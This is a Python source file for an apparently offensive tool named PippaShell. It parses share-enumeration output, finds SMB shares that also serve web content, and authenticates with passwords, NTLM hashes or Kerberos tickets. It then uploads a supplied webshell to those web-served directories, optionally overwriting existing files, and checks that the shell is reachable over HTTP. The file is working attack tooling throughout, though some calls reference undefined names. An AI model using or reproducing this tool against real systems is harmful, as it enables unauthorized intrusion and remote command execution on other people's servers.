import argparse
import requests
import random
import os
import logging as log
from typing import List
from libs.smbc import SMBClient
from alive_progress import alive_bar
from alive_progress.styles import showtime
from time import sleep
import asyncio
from termcolor import colored


class URLObject:
    def __init__(self, url: str, directories: List[str], hostname: str, filename: str, sharename: str):
        self.url = url
        self.directories = directories
        self.hostname = hostname
        self.filename = filename
        self.status = test_http_status(self.url)
        self.unc_path = '\\\\%s\\%s\\%s' % (hostname, sharename, directories)

# TODO Async function for http status?
def test_http_status(url):
    print(f'Testing:',(colored(f'{url}', 'green', attrs=["bold"])))
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',}
        page = requests.get(url, headers=headers, timeout=3)
        if page.status_code == 200:
            print(
f'''
╔.★..════════════════════════════╗

''',colored(f'Pippa has found a file!', 'cyan', attrs=["bold"]),''' ฅ^•ﻌ•^ฅ

╚════════════════════════════..★.╝
'''"\n")
        else:
            pass
            # print(f'[Status code]: {page.status_code}')
        return page.status_code
    except:
        print("Error with HTTP request. Is the server reachable?")
        return 9999


def test_shell_status(url):
    print((colored(f'Checking if the webshell can be accessed ...', 'green', attrs=["bold"])))
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',}
        page = requests.get(url, headers=headers, timeout=3)
        if page.status_code == 200:
            print("Shell has been found!")
        else:
            pass
            # print(f'[Status code]: {page.status_code}')
        return page.status_code
    except:
        print("Error with HTTP request. Is the server reachable?")
        return 9999

class MatchingFile:
    def __init__(self, fileshare_path, hostname, directories, filename, smb_url, sharename):
        self.fileshare_path = fileshare_path
        self.hostname = hostname
        self.directories = directories
        self.filename = filename
        self.smb_url = smb_url
        self.sharename = sharename

        self.urls = generate_url_objects(self)

    def __str__(self):
        return f'\n[Fileshare Path]: {self.fileshare_path}[Extracted Directories]: {self.directories} \n[Web Urls]: {self.urls} \n[Hostname]: {self.hostname} \n[Filename]: {self.filename} \n'


class UploadedFile:
    def __init__(self, smb_url, args, hostname, directories, share, file_to_upload, unc_path):
        self.smb_url = smb_url
        self.args = args
        self.hostname = hostname
        self.directories = directories
        self.share = share
        self.unc_path = unc_path
        self.filename = file_to_upload
        if len(self.directories) == 0:
            self.url = f'http://{hostname}/{file_to_upload}'
        else:
            self.url = f'http://{hostname}/{"/".join(directories)}/{file_to_upload}'
        self.status = test_shell_status(self.url)

def format_url(hostname: str, directories: List[str], filename: str) -> str:
    if len(directories) == 0:
        return f'http://{hostname}/{filename}'
    else:
        return f'http://{hostname}/{"/".join(directories)}/{filename}'


async def run_upload(smb_url, args, host, directories, share, file_to_upload, visited_full_paths):
    successful_upload = False
    # create SMBClient (using aiosmb)
    client = SMBClient(url=smb_url)
    unc_path = '\\\\%s\\%s' % (host, share)
    client.conn_url.domain = args.domain
    client.conn_url.username = args.user
    client.conn_url.secret = args.secret
    client.conn_url.server_ip = host
    client.conn_url.dc_ip = args.dc
    # Log in to each host
    _, err = await client.do_login()
    if err:
        log.critical(
            'Failed to login to %s. Please verify credentials are accurate and test connection with smbclient.' % (
                host))
        return false, visited_full_paths

    # connect to proper share
    full_path = os.path.join(unc_path, *directories)
    repeated_upload_path = full_path in visited_full_paths

    if not repeated_upload_path:
        print(f'\nUploading {file_to_upload} to {full_path}...')
        _, err = await client.do_use(unc_path)
        visited_full_paths.append(full_path)
        if err:
            log.warning('Unable to use %s, something went wrong. Please verify the share still exists.' % unc_path)
            return false, visited_full_paths

        for d in directories:
            await client.do_cd(d)
            if(args.verbose is not False):
                print(f'Changed directory to {d}')

        # ls files in only our directory
        file_exists = False
        async for item in client.do_enumall(1):
            # check if any of the file names match the file we're already trying to upload
            if item.unc_path.split('\\')[-1] == file_to_upload and args.force is False:
                print((colored(f'[{file_to_upload} already exists at {full_path}\\{file_to_upload}!]', 'yellow', attrs=['bold'])))
                log.info("file already exists!")
                file_exists = True
        if not file_exists:
            _, err = await client.do_put(file_to_upload)
            if err:
                log.warning('Unable to put %s, something went wrong.' % file_to_upload)
                log.critical(traceback.format_exc())
                return
            else:
                successful_upload = True
    await client.do_logout()
    return successful_upload, visited_full_paths


def generate_url_objects(current_file:MatchingFile) -> List[URLObject]:
    # Get required variables from the current MatchingFile object
    directory_choices = current_file.directories
    hostname = current_file.hostname
    filename = current_file.filename
    sharename = current_file.sharename
    # Create a list that will store the generated URLs that we will return
    ret_generated_urls = list()
    # Create a list that will store directories
    potential_directories = list()
    # Special case that generates a URL with no directories
    ret_generated_urls.append(URLObject(format_url(hostname, [], filename), [], hostname, filename, sharename))
    # Iterate over the directories given and create new URLs, each time getting longer.
    for i in range (0, len(directory_choices)):
        potential_directories.append(current_file.directories[i])
        url_string = format_url(hostname, potential_directories, filename)
        ret_generated_urls.append(URLObject(url_string, potential_directories, hostname, filename, sharename))
    return ret_generated_urls


if __name__ == '__main__':
    print(colored('''                                                                                                         
                                                                                                        ___
 ______   __     ______   ______   ______     ______     __  __     ______     __         __          __/_  `.  .-"""-.         
/\  == \ /\ \   /\  == \ /\  == \ /\  __ \   /\  ___\   /\ \_\ \   /\  ___\   /\ \       /\ \         \_,` | \-'  /   )`-')
\ \  _-/ \ \ \  \ \  _-/ \ \  _-/ \ \  __ \  \ \___  \  \ \  __ \  \ \  __\   \ \ \____  \ \ \____     "") `"`    \  ((`"`
 \ \_\    \ \_\  \ \_\    \ \_\    \ \_\ \_\  \/\_____\  \ \_\ \_\  \ \_____\  \ \_____\  \ \_____\   ___Y  ,    .'7 /|
  \/_/     \/_/   \/_/     \/_/     \/_/\/_/   \/_____/   \/_/\/_/   \/_____/   \/_____/   \/_____/  (_,___/...-` (_/_/     v1.0
    ''', 'red', attrs=["bold"]))
    # Commandline arguments for PippaShell
    parser = argparse.ArgumentParser(prog='PippaShell', description='Automatically hunts for webshell opportunities from Pippafetch output')
    file_info = parser.add_argument_group('Input options')
    file_info.add_argument('-i', '--input', dest='filename', action='store', help='Location of Pippafetch share enumeration file')
    # file_info.add_argument('filename', help='Location of Pippafetch output file')
    file_info.add_argument('-s', '--shell', dest='shell', action='store', help='location of webshell file to upload')
    file_info.add_argument('-o', '--output', dest='output', action='store', help='location/name of output file to create with upload info')
    file_info.add_argument('-f', '--force', dest='force', action='store_true', help='Forces files to be overwritten if they already exist on the share')

    connection = parser.add_argument_group('Connection options')
    connection.add_argument('-u', '--user', dest='user', action='store', help='Username to log in with')
    connection.add_argument('-p', '--pass', dest='pw', action='store', help='Password to log in with')
    connection.add_argument('-H', '--hash', dest='hash', action='store', help='Hash to log in with')
    connection.add_argument('-D', '--domain', dest='domain', default=None, action='store', help= 'Domain used during connection. Required for kerberos auth, optional for password/hash')
    connection.add_argument('-k', '--kerberos', dest='kerberos', default=False, action='store_true', help='Use Kerberos for authentication. Uses the standard KRB5CCNAME env variable for ccache file location')
    connection.add_argument('--dc', dest='dc', default=None, action='store', help='Domain Controller to query. If using kerberos authentication, this must be a hostname.')

    rt = parser.add_argument_group('Runtime options')
    rt.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Verbose mode. Provides additional debug information in the commandline')

    args = parser.parse_args()


    # Opening the input file (PippaFetch output)
    try:
        num_lines = sum(1 for _ in open(args.filename, 'r'))
        input_file = open(args.filename)
    except:
        print("File not found or could not be opened. Please confirm you have the right path!")
    # Creating a list that will store all individual "lines" that match our file extension criteria as an object
    matching_file_objects = list()
    successful_file_uploads = list()
    print("Extracting information from file...")
    with alive_bar(num_lines, title = 'Generating HTTP requests...', bar = 'smooth', spinner = 'arrows_out', enrich_print = False, calibrate = 10000) as bar:
        for current_line in input_file:
            # showtime()
            # Extracting fields
            split_line = current_line.replace('\n', '').split("\\")
            extracted_filename = split_line[-1]
            bar()
            if extracted_filename.endswith((".aspx", ".js", ".php", ".html", ".css")):
                extracted_hostname = split_line[2]
                extracted_sharename = split_line[3]
                extracted_directories_list = list()
                for i in range(4, len(split_line)-1):
                    # Add all directories as individual elements in the extracted_directories_list
                    extracted_directories_list.append(split_line[i])
                smb_url = ''
                if args.pw and args.domain:
                    smb_url = 'smb+ntlm-password://%s\\%s:%s@%s' % (args.domain, args.user, args.pw, extracted_hostname)
                    args.secret = args.pw
                elif args.hash and args.domain:
                    smb_url = 'smb+ntlm-nt://%s\\%s:%s@%s' % (args.domain, args.user, args.hash, extracted_hostname)
                    args.secret = args.hash
                elif args.pw:
                    smb_url = 'smb+ntlm-password://%s:%s@%s' % (args.user, args.pw, extracted_hostname)
                    args.secret = args.pw
                elif args.hash:
                    smb_url = 'smb+ntlm-nt://%s:%s@%s' % (args.user, args.hash, extracted_hostname)
                    args.secret = args.hash
                elif args.kerberos:
                    try:
                        smb_url = 'smb+kerberos-ccache://%s\\%s:%s@%s/?dc=%s' % (
                            args.domain, args.user, args.ccache.replace('/', '%2F'), extracted_hostname, args.dc)
                    except:
                        log.critical(
                            'Something went wrong generating the connection url, likely due to an invalid CCACHE file. Make sure to point the KRB5CCNAME environment variable to your valid ccache file.')
                        sys.exit(1)
                    args.secret = args.ccache
                # Create a new MatchingFile object for each line that matches the extracted_extensions we want
                new_file_to_find = MatchingFile(current_line, extracted_hostname, extracted_directories_list, extracted_filename, smb_url, extracted_sharename)
                matching_file_objects.append(new_file_to_find)

    visited_full_paths = list()
    if args.shell is not None:
        for current_matching_file_object in matching_file_objects:
           for current_url_object in current_matching_file_object.urls:
                if current_url_object.status == 200:
                    successful_upload, visited_full_paths = asyncio.run(run_upload(smb_url, args, current_url_object.hostname, current_url_object.directories, current_matching_file_object.sharename, args.shell, visited_full_paths))
                    if successful_upload:
                        successful_file = UploadedFile(smb_url, args, current_url_object.hostname, current_url_object.directories, current_matching_file_object.sharename, args.shell, current_url_object.unc_path)
                        successful_file_uploads.append(successful_file)
                        print(f'File was uploaded successfully!')
                        print(colored(f'Try to locate the file at {successful_file.url} !', 'yellow', attrs=['bold']))
        print(f'\nThere were {len(successful_file_uploads)} new instances of {args.shell} uploaded successfully')
        if(len(successful_file_uploads) == 0):
            print(colored("Please check the log to determine if the file already existed at the target upload path or if another error occured. \nIf you want to forcibly replace an existing file, please use the -f commandline argument!", "red", attrs=["bold"]))
    else:
        for current_matching_file_object in matching_file_objects:
           for current_url_object in current_matching_file_object.urls:
                if current_url_object.status == 200:
                    print(f'\nWebserver opportunity at UNC Path: {current_matching_file_object.sharename}\nWebserver opportunity at HTTP: {current_url_object.url}\n')

    if args.output is not None and args.shell is not None:
        try:
            # creating output file
            output_file = open(args.output, "w+")
        except:
            output_file = None
            print("File could not be created! Do you have write permissions for this directory?")
        if len(successful_file_uploads) != 0:
            output_file.write(f'{len(successful_file_uploads)} Successful upload(s) of {args.shell} to:\n\n')
            for upload in successful_file_uploads:
                full_path = os.path.join(upload.hostname, upload.share, *upload.directories, args.shell)
                output_file.write(f'\\\\{full_path}\n')
                output_file.write(f'{upload.url}\n\n')
        else:
            output_file.write(f'There were no instances of {args.shell} that uploaded successfully.\nPlease check the log to determine if the file already existed at the target upload path or if another error occured. \nIf you want to forcibly replace an existing file, please use the -f commandline argument!')

        print(f'\nCreated output file at: {args.output}')